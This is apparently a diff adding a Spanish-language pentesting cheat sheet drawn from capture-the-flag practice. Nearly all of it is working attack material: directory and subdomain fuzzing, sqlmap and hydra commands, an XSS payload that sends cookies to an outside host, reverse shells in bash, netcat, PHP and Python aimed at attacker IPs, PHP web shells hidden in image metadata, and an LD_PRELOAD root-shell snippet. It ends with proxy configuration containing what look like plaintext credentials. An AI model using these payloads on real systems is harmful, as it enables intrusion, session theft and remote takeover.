@@ -1,0 +1,193 @@
+
+########################[FUZZING:]################################
+
+gobuster dir -u <url> -w /usr/share/wordlists/
+gobuster vhost -u <url> -w <wordlist>
+gobuster dir -u <url> --proxy <proxy> -w <wordlist>
+gobuster dir -u <url> --proxy <proxy> -w <wordlist> --add-slash
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -X POST -u 'http://thelondonbridge.thm:8080/view_image' -H 'Content-Type: application/x-www-form-urlencoded' -d 'FUZZ=/uploads/04.jpg' -fw 226 
+ffuf -w ~/hacking-lab/scanning/fuzzing/SecLists/Fuzzing/4-digits-0000-9999.txt -u "http://airplane.thm:8000/?page=./../../../../proc/FUZZ/cmdline"  -fw 3
+ffuf -u http://vulnnet.thm -c -w /usr/share/seclist/Discovery/DNS/subdomains-top1million-5000.txt -H ‘Host: FUZZ.vulnnet.thm’ -fs 0 -fs 65
+#################################[sqlmap:]################################################
+
+sqlmap -u <url> -p <parametro> --dbms=MySQL --dbs
+sqlmap -u <url> -p <parametro> -D <database> --tables --dump
+sqlmap -r <rquest> -dbs --banner
+hydra -L usernames.txt -P xxxxx.txt <ip> mysql
+
+#conexion con mysql:
+mysql -h <host> -u<user> -p
+
+#################################[netcat en espera de shel:]################################################################
+
+nc -lvpn <port> -> for Listening
+
+#################################[otros comandos:]################################################################
+
+(env || set) 2>/dev/nul             ## enumerar las variables de entorno
+find / -perm -4000 2>/dev/null      ## buscar archivos con el bit de permisos setuid activado 
+cat ./bash_history                  ## 
+echo "cadena" | md5sum
+command | awk 'NF{print $NF}' # seleccionar el ultimo argumento del output
+exiftool -Comment='<?php system($_GET['cmd']); ?>' image/gif
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+ss -tl >> listar conexiones en espera tcp/udp
+curl -v <url> --proxy <proxy-url>
+curl -s -X "GET" url -G --data-urlencode "parameter=value"
+chmod u+s bash # asignar permisos suid a la bash
+/usr/share/wordlists/dirb/common.txt -> diccionario para enumerar archivos
+ssh -i id_rsa user@host  ##conectarse usando el id_rsa
+
+########################################[FILE UPLOAD]###########################################################
+Extenciones php alternativas: php1-7, pht, phps, phtml, phtml, phar
+AddType application/x-httpd-php .extension # subir un archivo .htaccess para que las extenciones .extension sean interpretadas como php 
+
+
+#################################[XSS cookie catching]################################################
+
+<script>document.write('<img src="http://IP:PORT/'+document.cookie+'" />')</script>
+
+####################[REVERSES SHELL]###########################################################################
+
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.8.13.70 7896 > /tmp/f
+
+#bash reverse shell
+'bash -c "bash -i >& /dev/tcp/myip/port 0>&1"'  {=%26}
+
+#Netcat reverse shell
+nc IP PORT -e /bin/bash
+
+#PHP reverse shell
+php -r '$sock=fsockopen("10.9.3.118",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+#PHP RCE:
+<?php system($_GET['cmd']);?>
+
+#python reverse shell
+1- python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.3.118",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`
+
+2- export RHOST="10.0.0.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+
+############################[PGP && ASC extract:]###############################################################
+
+gpg --import file.asc
+gpg --decrypt file.pgp
+
+###########################[HASCAT]################################################
+
+hashcat file_hash /usr/share/wordlists/rockyou.txt 
+
+#################################[JOHN]################################################
+
+john hash
+
+[#pgp2john]
+
+gpg2john private.asc > pri_hash
+
+#################################[proxy-tunnel para ssh por hhtp-proxy]################################################
+
+❯ proxytunnel -p <ip-victima>:<httpproxyport> -d 127.0.0.1:<sshport> -a 1234
+❯ ssh <user>@127.0.0.1 -p 1234
+
+#################################[wrappers php:]################################################
+
+  "php://filter/convert.base64-encode/resource=file.txt"
+  "php://filter/convert.base64-decode/resource=file.txt"
+  "php://filter/convert.quoted-printable-encode/resource=file.txt"
+  "php://filter/convert.quoted-printable-decode/resource=file.txt"
+  "data://text/plain;base64,payload_en_base64"
+  """url/file=php://input
+     <?php system("whoami"); ?>"""
+  "php://filter/convert.iconv.utf-8.utf-16/resource=file.txt"
+  "php://filter/read=string.rot13/resource=file.txt"
+
+################################[tratamiento de la tty:]#######################################################################
+
+$ script /dev/null -c bash |ó| python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@host:/$ ^Z             #Luego de esto presionamos ctrl_z para suspender la shell
+~$> stty raw -echo; fg          #Ahora resetearemos la configuración de la shell que dejamos en segundo plano indicando reset y xterm
+reset
+Terminal type? xterm
+www-data@host:/$ export TERM=xterm
+www-data@host:/$ export SHELL=bash
+~$> ssty size
+www-data@host:/$ stty rows 40 columns 123
+
+######################################[URL CODE]############################################################################
+' ' = %20
+';' = %3b
+'\r'= %0d
+'\n'= %0a
+''' = %27
+'/' = %2F
+################################################[PADBUSTER]###########################################################
+Use: padbuster URL EncryptedSample BlockSize [options] 
+#descripcion:
+usado para ataques de oraculo de relleno. Esto consiste en tratar de descifrar un texto >>
+cifrado mediante cifrado por bloques, aprovechando el tamaño del bloque de cifrado y >>
+los caracteres de relleno
+
+##################################################[Ataque de transferencia de zona]#########################################
+dig axfr @ip domain
+
+################################################[LD-PRELOAD vuln]###########################################################
+Crearemos una shell en C:
+#include 
+    #include 
+    #include 
+    void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/sh");
+    }
+
+Ahora procedemos a compilar el fichero y ejecutarlo y ya tendremos una shell como Root
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+sudo LD_PRELOAD=/tmp/shell.so find
+
+
+######################[PROXY A NIVEL DE SISTEMA]##########################################
+#```sh
+   sudo nano /etc/apt/apt.conf.d/95proxies
+   ```
+
+2. **Agregar la configuración del proxy**:
+
+   Añade las siguientes líneas al archivo para configurar el proxy con las credenciales proporcionadas:
+
+   ```plaintext
+   Acquire::http::proxy "http://davidg:golal90@10.0.0.1:8080/";
+   Acquire::https::proxy "http://davidg:golal90@10.0.0.1:8080/";
+   ```
+
+
+ ```sh
+   sudo nano /etc/environment
+   ```
+
+2. **Agregar las variables de entorno del proxy**:
+
+   Añade las siguientes líneas al archivo para configurar las variables de entorno del proxy:
+
+   ```plaintext
+   http_proxy="http://davidg:golal90@10.0.0.1:8080/"
+   https_proxy="http://davidg:golal90@10.0.0.1:8080/"
+   ftp_proxy="http://davidg:golal90@10.0.0.1:8080/"
+   no_proxy="localhost,127.0.0.1,::1"
+   ```
+
+```sh
+   sudo nano /etc/wgetrc
+   ```
+
+2. **Agregar la configuración del proxy**:
+
+   Añade las siguientes líneas para configurar el proxy:
+
+   ```plaintext
+   use_proxy = on
+   http_proxy = http://davidg:golal90@10.0.0.1:8080/
+   https_proxy = http://davidg:golal90@10.0.0.1:8080/
+   ```
